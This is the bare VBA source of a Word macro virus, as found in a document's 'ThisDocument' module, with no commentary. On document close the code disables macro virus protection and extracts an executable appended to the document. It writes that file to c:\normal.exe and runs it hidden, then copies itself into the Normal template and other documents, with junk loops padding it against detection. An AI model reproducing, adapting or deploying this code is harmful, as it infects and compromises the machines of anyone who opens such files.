   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Declare Function SetEndOfFile Lib "kernel32" Alias "setendoffile" (ByVal h As Long) As Boolean
   Private Declare Function OpenFile Lib "kernel32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long
   Private Declare Function CreateFile Lib "kernel32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long
   Private Declare Function GlobalAlloc Lib "kernel32" (ByVal fl As Long, ByVal n As Long) As Long
   Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
   Private Declare Function SeekFile Lib "kernel32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long) As Long
   Private Declare Sub ReadFile Lib "kernel32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
   Private Declare Sub WriteFile Lib "kernel32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
   Private Declare Sub CloseFile Lib "kernel32" Alias "_lclose" (ByVal h As Long)

   Private Sub Document_Close()

   On Error Resume Next
   Options.VirusProtection = False
   Const ker = "Miñrîsîft Îfficå"

   Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
   Dim dad, dnt As Object
   Dim OurCode, UserAddress, LogData, LogFile As String
   Dim dc As String, xe As String
   Dim dh As Long, dp As Long, ss As Long
   Dim x_z, z_y, z_z, z_a, z_b As Long
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
   xe = "c:\normal.exe"

   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

   Set dad = ActiveDocument.VBProject.VBComponents.Item(1)
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
   Set dnt = NormalTemplate.VBProject.VBComponents.Item(1)
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
   DocumentInfected = dad.CodeModule.Find(ker, 1, 1, 10000, 10000)
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
   NormalTemplateInfected = dnt.CodeModule.Find(ker, 1, 1, 10000, 10000)
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
   dc = ActiveDocument.Name
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

    dp = GlobalAlloc(0, 50698)
    dh = OpenFile(dc, 0)
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

    If SetEndOfFile(dh) Then
           ss = SeekFile(dh, -50688, 2)
           ReadFile dh, dp, 50688
           CloseFile dh
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

            dh = CreateFile(xe, 0)
            WriteFile dh, dp, 50698
            CloseFile dh
             Shell "c:\normal.exe", vbHide

           End If


   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

   If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
      (ActiveDocument.SaveFormat = wdFormatDocument Or _
      ActiveDocument.SaveFormat = wdFormatTemplate) Then


   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

      If DocumentInfected = True Then
         SaveNormalTemplate = NormalTemplate.Saved
         OurCode = dad.CodeModule.Lines(1, dad.CodeModule.CountOfLines)

   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

         For i = 1 To Len(Application.UserAddress)
         If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
           If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
             For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
             UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
           End If
         Else
           UserAddress = UserAddress & Chr(13) & "' "
         End If
        Next i

   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z


       dnt.CodeModule.DeleteLines 1, dnt.CodeModule.CountOfLines
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
       dnt.CodeModule.AddFromString OurCode
    For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
       If SaveNormalTemplate = True Then NormalTemplate.Save
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

     End If


     If NormalTemplateInfected = True And _
        (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
        ActiveDocument.Saved = False) Then
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
       SaveDocument = ActiveDocument.Saved
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

       OurCode = dnt.CodeModule.Lines(1, dnt.CodeModule.CountOfLines)
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
       dad.CodeModule.DeleteLines 1, dad.CodeModule.CountOfLines
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z
       dad.CodeModule.AddFromString OurCode
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

       If SaveDocument = True Then ActiveDocument.Save
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

     End If

   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

   End If
   For x_z = 1 To 30
    z_y = 2
    z_z = 6
    z_a = 9
    z_b = 1
   Next x_z

   End Sub
